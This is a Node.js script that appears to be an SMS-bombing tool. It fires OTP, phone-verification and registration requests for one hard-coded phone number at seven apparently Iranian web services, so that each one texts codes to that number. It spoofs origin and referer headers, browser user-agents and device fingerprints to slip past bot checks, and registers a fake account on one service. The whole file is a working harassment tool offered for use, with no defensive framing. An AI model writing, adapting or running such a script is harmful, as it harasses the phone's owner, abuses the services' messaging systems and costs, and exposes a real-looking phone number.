import axios from "axios";
import chalk from "chalk";
import { randomUUID } from "crypto";

const PHONE_NUMBER = "9030422838";

const runService = async ({ name, headers, api, params, method = "POST" }) => {
  try {
    const options = {
      method,
      url: api,
      headers,
      timeout: 8000,
    };

    if (method === "GET") {
      options.params = params;
    } else {
      options.data = params;
    }

    await axios(options);

    console.log(chalk.green(`${name} ✓ Success`));
  } catch (err) {
    const status = err.response?.status || err.code || "Unknown";
    console.log(chalk.red(`${name} ✗ Failed (${status})`));
  }
};

const services = [
  {
    name: "Aloghesti",
    api: "https://api.aloghesti.com/api/v1/initial-user",
    params: { mobile: "0" + PHONE_NUMBER },
    headers: { Origin: "https://aloghesti.com" },
    method: "POST",
    enabled: true,
  },
  {
    name: "Ammaryar",
    api: "https://ammaryar.ir/register_ajax",
    params: { mobile: PHONE_NUMBER, conf: 1 },
    headers: {
      Origin: "https://ammaryar.ir",
      Host: "ammaryar.ir",
      "Content-Type": "application/x-www-form-urlencoded",
    },
    method: "POST",
    enabled: true,
  },
  {
    name: "Okala",
    api: "https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister",
    params: {
      mobile: "0" + PHONE_NUMBER,
      confirmTerms: true,
      notRobot: false,
      ValidationCodeCreateReason: 5,
      OtpApp: 0,
      deviceTypeCode: 10,
      IsAppOnly: false,
    },
    headers: {
      "session-id": randomUUID(),
      source: "okala",
      "ui-version": "2.0",
      "x-correlation-id": randomUUID(),
      "x-user-unique-id": randomUUID(),
    },
    method: "POST",
    enabled: true,
  },
  {
    name: "Behtarino",
    api: "https://bck.behtarino.com/api/v1/users/jwt_phone_verification/",
    params: { phone: "0" + PHONE_NUMBER },
    headers: { site: "behtarino" },
    method: "POST",
    enabled: true,
  },
  {
    name: "Torob",
    api: "https://api.torob.com/v4/user/phone/send-pin/",
    method: "GET",
    params: {
      phone_number: "0" + PHONE_NUMBER,
      _http_referrer: "https://www.google.com/",
      source: "next_desktop",
      _landing_page: "home",
    },
    headers: {
      Origin: "https://torob.com",
      Referer: "https://torob.com/",
      "User-Agent":
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
      Accept: "*/*",
    },
    enabled: true,
  },
  {
    name: "DigikalaJet",
    api: "https://api.digikalajet.ir/user/login-register/",
    method: "POST",
    params: {
      phone: "0" + PHONE_NUMBER,
    },
    headers: {
      "app-id": "c2bd4460-0e3f-41a7-922c-100b9cb15bd6",
      client: "mobile",
      clientid: "FINGERPRINT-" + randomUUID().replace(/-/g, ""),
      "clientid-v2": "FINGERPRINTV2-" + randomUUID().replace(/-/g, ""),
      clientos: "Linux",
      "content-type": "application/json",
      origin: "https://www.digikalajet.com",
      referer: "https://www.digikalajet.com/",
      session: randomUUID() + "-V2*" + Date.now(),
      "x-request-uuid": randomUUID(),
      "user-agent":
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
      accept: "application/json, text/plain, */*",
    },
    enabled: true,
  },
  {
    name: "123Kif",
    api: "https://api.123kif.com/api/auth/Register",
    method: "POST",
    params: {
      mobile: "0" + PHONE_NUMBER,
      password: "1234",
      firstName: "test",
      lastName: "test",
      refferCode: "",
      platform: "web",
    },
    headers: {
      origin: "https://123kif.com",
      referer: "https://123kif.com/",
      "content-type": "application/json; charset=UTF-8",
      zhoobinuname: "f1656e60-242a-4136-7ca7-60bc69041d65",
    },
    enabled: true,
  },
];

(async () => {
  for (const service of services) {
    if (service.enabled) {
      await runService(service);
    }
  }
})();
